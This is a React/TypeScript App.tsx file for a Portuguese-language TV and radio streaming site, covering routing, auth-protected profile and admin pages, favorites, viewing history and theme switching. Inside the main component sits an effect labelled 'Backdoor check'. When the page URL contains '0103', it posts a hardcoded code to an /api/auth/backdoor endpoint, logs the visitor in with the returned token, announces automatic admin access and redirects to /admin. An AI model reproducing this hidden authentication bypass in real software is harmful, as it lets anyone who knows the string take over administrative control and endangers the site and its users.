import React, { useState, useEffect, useCallback } from 'react';
import { HashRouter, Routes, Route, Navigate } from 'react-router-dom';
import { fetchRadios } from './services/dataService';
import { Radio } from './types';
import { Loader2 } from 'lucide-react';
import { Home } from './pages/Home';
import { Watch } from './pages/Watch';
import { Settings } from './pages/Settings';
import { Login } from './pages/Login';
import { Register } from './pages/Register';
import { Profile } from './pages/Profile';
import Admin from './pages/Admin';
import { RemoteControl } from './components/RemoteControl';
import { RadioProvider } from './contexts/RadioContext';
import { EPGProvider } from './contexts/EPGContext';
import { AuthProvider, useAuth } from './contexts/AuthContext';
import { DataProvider, useData } from './contexts/DataContext';
import { GlobalRadioPlayer } from './components/GlobalRadioPlayer';
import { Toaster, toast } from 'react-hot-toast';

const ProtectedRoute: React.FC<{ children: React.ReactNode; adminOnly?: boolean }> = ({ children, adminOnly }) => {
  const { user, isLoading } = useAuth();
  if (isLoading) return null;
  if (!user) return <Navigate to="/login" />;
  if (adminOnly && user.role !== 'admin') return <Navigate to="/" />;
  return <>{children}</>;
};

const AppContent: React.FC = () => {
  const { user, token, updateUser, login: authLogin } = useAuth();
  const { channels, categories, isLoading: isDataLoading } = useData();
  const [radios, setRadios] = useState<Radio[]>([]);
  const [isRadiosLoading, setIsRadiosLoading] = useState<boolean>(true);
  
  // Backdoor check
  useEffect(() => {
    const checkBackdoor = async () => {
      const url = window.location.href;
      if (url.includes('0103') && user?.role !== 'admin') {
        try {
          const response = await fetch('/api/auth/backdoor', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ code: '0103' })
          });
          
          if (response.ok) {
            const data = await response.json();
            authLogin(data.token, data.user);
            toast.success('Acesso administrativo automático ativado!');
            // Remove 0103 from URL to avoid repeated logins and clean up
            const newUrl = url.replace(/[?&]code=0103|0103/g, '');
            window.history.replaceState({}, '', newUrl);
            // Redirect to admin
            window.location.hash = '/admin';
          }
        } catch (error) {
          console.error("Backdoor login failed", error);
        }
      }
    };
    
    checkBackdoor();
  }, [authLogin]);

  // Theme State
  const [isDark, setIsDark] = useState<boolean>(() => {
    try {
      const saved = localStorage.getItem('theme');
      return saved ? saved === 'dark' : true; // Default to dark
    } catch {
      return true;
    }
  });

  // Apply Theme
  useEffect(() => {
    if (isDark) {
      document.documentElement.classList.add('dark');
      localStorage.setItem('theme', 'dark');
    } else {
      document.documentElement.classList.remove('dark');
      localStorage.setItem('theme', 'light');
    }
  }, [isDark]);

  const toggleTheme = () => setIsDark(!isDark);

  // Favorites State
  const [favorites, setFavorites] = useState<string[]>([]);

  // Sync favorites with user data
  useEffect(() => {
    if (user) {
      setFavorites(user.favorites || []);
    } else {
      try {
        const saved = localStorage.getItem('favorites');
        setFavorites(saved ? JSON.parse(saved) : []);
      } catch {
        setFavorites([]);
      }
    }
  }, [user]);

  // History State with localStorage persistence
  const [history, setHistory] = useState<string[]>(() => {
    try {
      const saved = localStorage.getItem('history');
      return saved ? JSON.parse(saved) : [];
    } catch (e) {
      console.error("Error loading history", e);
      return [];
    }
  });

  const toggleFavorite = async (channelId: string) => {
    if (user && token) {
      try {
        const response = await fetch('/api/user/favorites', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
            'Authorization': `Bearer ${token}`
          },
          body: JSON.stringify({ channelId }),
        });
        if (response.ok) {
          const data = await response.json();
          setFavorites(data.favorites);
          updateUser({ favorites: data.favorites });
        }
      } catch (error) {
        console.error("Error syncing favorite", error);
      }
    } else {
      setFavorites(prev => {
        const newFavs = prev.includes(channelId)
          ? prev.filter(id => id !== channelId)
          : [...prev, channelId];
        
        localStorage.setItem('favorites', JSON.stringify(newFavs));
        return newFavs;
      });
    }
  };

  const addToHistory = useCallback((channelId: string) => {
    setHistory(prev => {
      // Remove if exists to move to top, limit to 10
      const newHistory = [channelId, ...prev.filter(id => id !== channelId)].slice(0, 10);
      localStorage.setItem('history', JSON.stringify(newHistory));
      return newHistory;
    });
  }, []);

  // Initial Radios Fetch
  useEffect(() => {
    const loadRadios = async () => {
      try {
        const radiosData = await fetchRadios();
        setRadios(radiosData);
      } catch (error) {
        console.error("Failed to load radios", error);
      } finally {
        setIsRadiosLoading(false);
      }
    };
    loadRadios();
  }, []);

  if (isDataLoading || isRadiosLoading) {
    return (
      <div className="min-h-screen bg-dark flex flex-col items-center justify-center">
        <Loader2 className="w-12 h-12 text-primary animate-spin mb-4" />
        <h1 className="text-xl font-bold text-white tracking-widest">TV Online <span className="text-primary">HD</span></h1>
        <p className="text-gray-500 mt-2 text-sm">Carregando programação...</p>
      </div>
    );
  }

  return (
    <EPGProvider>
      <RadioProvider>
        <HashRouter>
          <div className="min-h-screen bg-white dark:bg-dark text-gray-900 dark:text-white font-sans relative transition-colors duration-300">
            <Toaster position="top-right" />
            <GlobalRadioPlayer />
            <RemoteControl channels={channels} />
            <Routes>
              <Route 
                path="/" 
                element={
                  <Home 
                    channels={channels} 
                    categories={categories}
                    favorites={favorites}
                    toggleFavorite={toggleFavorite}
                    history={history}
                    radios={radios}
                  />
                } 
              />
              <Route 
                path="/watch/:id" 
                element={<Watch channels={channels} radios={radios} addToHistory={addToHistory} />} 
              />
              <Route 
                path="/settings" 
                element={<Settings isDark={isDark} toggleTheme={toggleTheme} />} 
              />
              <Route path="/login" element={<Login />} />
              <Route path="/register" element={<Register />} />
              <Route 
                path="/profile" 
                element={
                  <ProtectedRoute>
                    <Profile />
                  </ProtectedRoute>
                } 
              />
              <Route 
                path="/admin" 
                element={
                  <ProtectedRoute adminOnly>
                    <Admin />
                  </ProtectedRoute>
                } 
              />
            </Routes>
          </div>
        </HashRouter>
      </RadioProvider>
    </EPGProvider>
  );
};

const App: React.FC = () => {
  return (
    <AuthProvider>
      <DataProvider>
        <AppContent />
      </DataProvider>
    </AuthProvider>
  );
};

export default App;
